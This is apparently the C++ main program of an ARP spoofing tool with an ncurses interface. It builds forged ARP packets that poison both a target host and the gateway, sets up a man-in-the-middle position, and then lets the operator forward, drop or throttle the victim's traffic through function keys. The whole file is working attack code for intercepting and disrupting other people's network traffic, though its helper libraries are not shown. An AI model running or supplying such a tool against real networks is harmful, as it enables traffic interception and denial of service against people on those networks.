#include "arp_spoofer_lib/headers/AdapterQuery.h"
#include "arp_spoofer_lib/headers/net_structure.h"
#include "arp_spoofer_lib/headers/ARPSpoofing.h"
#include "arp_spoofer_lib/headers/PacketHandler.h"
#include "ncurses_gui/headers/StatusBar.h"
#include "ncurses_gui/headers/CommandLineArgParsing.h"

#include <thread>
#include <string>
#include <list>
#include <atomic>
#include <random>
#include <ncurses.h>
#include <cstdio>

using std::thread;
using std::list;
using std::atomic_bool;
using std::fopen, std::fscanf;


int main(int argc, char **argv) {
#ifdef BPF_FILTER
    char filter_buf[PCAP_ERRBUF_SIZE];
    bpf_program bpf;
    sprintf(filter_buf, "ether host %02x:%02x:%02x:%02x:%02x:%02x",
            EXPAND_MAC(target_mac));

#ifdef DEBUG
    printf("filter buf: %s\n", filter_buf);
#endif

    // compile bpf filter
    if (pcap_compile(adapter, &bpf, filter_buf,
                     1, PCAP_NETMASK_UNKNOWN) < 0) {
        pcap_perror(adapter, "Error occurred when "
                             "compiling BPF filter");
        pcap_close(adapter);
        return -1;
    }

    // set bpf filter on adapter
    if (pcap_setfilter(adapter, &bpf) < 0) {
        pcap_perror(adapter, "Error occurred when "
                             "setting BPF filter");
        pcap_close(adapter);
        return -1;
    }
#endif

    CommandLineArgs cmd_args = parse_cmd_args(argc, argv);

    // Let user select the network interface used to capture packets
    string dev_name = list_dev_and_choose_dev();

    pcap_t *adapter = open_adapter(dev_name);

    arp_packet *spoofing_target_packet = arp_packet_constructor(cmd_args.gateway_ip, cmd_args.self_mac,
                                                                cmd_args.target_ip, cmd_args.target_mac);
    ARP_packet_sender target_spoofer(adapter, spoofing_target_packet, 10);

    arp_packet *spoofing_gateway_packet = arp_packet_constructor(cmd_args.target_ip, cmd_args.self_mac,
                                                                 cmd_args.gateway_ip, cmd_args.gateway_mac);
    ARP_packet_sender gateway_spoofer(adapter, spoofing_gateway_packet, 1000);

    // TODO: Add ARP recovering

    concurrent_queue<string> pkt_handler_thread_output_q(100);
    PacketHandler pkt_h(adapter, cmd_args.self_mac,
                        cmd_args.target_mac, cmd_args.gateway_mac,
                        cmd_args.target_ip, std::ref(pkt_handler_thread_output_q));

    /*------------------------------Initialize the Window--------------------------------------*/
    constexpr int MIN_WINDOWS_COLS = 90;
    constexpr int MIN_WINDOWS_LINES = 10;
    constexpr int ERR_WINDOW_TOO_SMALL = -1;
    constexpr short STATUS_COLOR_PAIR = 1;

    bool window_loop_to_stop = false;
    int gui_err = 0;

    initscr();
    use_default_colors();
    noecho();
    timeout(1);
    curs_set(0);
    set_escdelay(25);
    keypad(stdscr, true);

    if (!has_colors()) {
        endwin();
        printf("The terminal does not support color!\n");
        _exit(-1);
    }
    if (COLS < MIN_WINDOWS_COLS || LINES < MIN_WINDOWS_LINES) {
        window_loop_to_stop = true;
        gui_err = ERR_WINDOW_TOO_SMALL;
    }
    start_color();
    init_pair(STATUS_COLOR_PAIR, COLOR_BLACK, COLOR_GREEN);
    /*---------------------Finished Initializing the Window----------------------------------*/

    /*---------------------Some Variables that will be used in window loop below-------------*/
    int winx, winy, curx, cury;
    const int BUF_SIZE = 100;
    u_long input_rate;
    StatusBar status_bar(pkt_h.get_rate_cref());

    enum GuiState {
        InputRateMode,
        EchoMode
    };

    GuiState gui_state = GuiState::EchoMode;
    StatusBar::PktPolicy previous_status_bar_policy = StatusBar::PktPolicy::Forward;
    int before_seq = concurrent_queue<int>::DEFAULT_SEQ;    // used to examine if any new output \
                                                               from packet handler thread arrives
    int ch; // character enter in every loop
    list<string> output_buf; // store the contents printed above the status bar
    /*----------------------------------------------------------------------------------------*/

    target_spoofer.start();
    gateway_spoofer.start();
    pkt_h.start();

    while (true) {
        if (window_loop_to_stop)
            break;

        ch = getch();
        erase();

        getmaxyx(stdscr, winy, winx);
        if (ch == KEY_RESIZE) {
            if (COLS < MIN_WINDOWS_COLS || LINES < MIN_WINDOWS_LINES) {
                window_loop_to_stop = true;
                gui_err = ERR_WINDOW_TOO_SMALL;
            }
        }

        switch (gui_state) {
            case GuiState::EchoMode: {
                switch (ch) {
                    case KEY_F(1):
                        status_bar.set_pkt_policy(StatusBar::PktPolicy::Forward);
                        pkt_h.set_drop_packet(false);
                        pkt_h.set_rate_limit_kBps(ulong_limits::max());
                        break;
                    case KEY_F(2):
                        status_bar.set_pkt_policy(StatusBar::PktPolicy::Drop);
                        pkt_h.set_drop_packet(true);
                        break;
                    case KEY_F(3):
                        gui_state = GuiState::InputRateMode;
                        previous_status_bar_policy = status_bar.get_pkt_policy();
                        status_bar.set_pkt_policy(StatusBar::PktPolicy::EnteringRateValue);
                        break;
                    case 'q':
                        window_loop_to_stop = true;
                        break;
                    default:
                        /* Do nothing*/;
                }

                break;
            }
            case GuiState::InputRateMode: {
                switch (ch) {
                    case KEY_BACKSPACE: {
                        status_bar.pop_last_of_input_buf();
                        break;
                    }
                    case 10 /*ENTER*/:
                        gui_state = GuiState::EchoMode;

                        input_rate = status_bar.read_input_buf_as_num();
                        if (input_rate == ulong_limits::max())
                            goto ENTER_FAILED;

                        pkt_h.set_rate_limit_kBps(input_rate);
                        status_bar.clear_input_buf();
                        status_bar.set_pkt_policy(StatusBar::PktPolicy::LimitRate);
                        break;
                    case 27 /*KEY_ESC*/:
                    ENTER_FAILED:
                        gui_state = GuiState::EchoMode;
                        status_bar.clear_input_buf();
                        status_bar.set_pkt_policy(previous_status_bar_policy);
                        break;
                    default:
                        if (isdigit(ch))
                            status_bar.append_char_to_input_buf(ch);
                }
                break;
            }
        }

        // print status bar
        attron(COLOR_PAIR(STATUS_COLOR_PAIR));
        mvprintw(LINES - 1, 0, "%s", status_bar.get_status_bar_str(winx).c_str());
        attroff(COLOR_PAIR(STATUS_COLOR_PAIR));

        // check if any new output arrives
        if (before_seq == pkt_handler_thread_output_q.m_updated_seq)
            continue;

        // get all new outputs
        before_seq = pkt_handler_thread_output_q.m_updated_seq;
        queue<string> ret_q = pkt_handler_thread_output_q.pop_all();
        while (!ret_q.empty()) {
            output_buf.push_front(ret_q.front());
            ret_q.pop();
            if (output_buf.size() > BUF_SIZE)
                output_buf.pop_back();
        }

        if (output_buf.empty())
            continue;

        // print output above status bar
        auto iter = output_buf.begin();
        for (int now_y = std::min((unsigned long) (LINES - 2), output_buf.size() - 1); now_y >= 0; now_y--) {
            mvprintw(now_y, 0, "%s", (iter++)->c_str());
        }

    }
    endwin();

    switch (gui_err) {
        case ERR_WINDOW_TOO_SMALL:
            printf("Windows size must be at least %dx%d!\n", MIN_WINDOWS_COLS, MIN_WINDOWS_LINES);
        default:
            break;
    }

    printf("Exiting...\n");

    // TODO: Add controlling for starting or stopping things below
    target_spoofer.stop();
    gateway_spoofer.stop();
    pkt_h.stop();

    return 0;
}
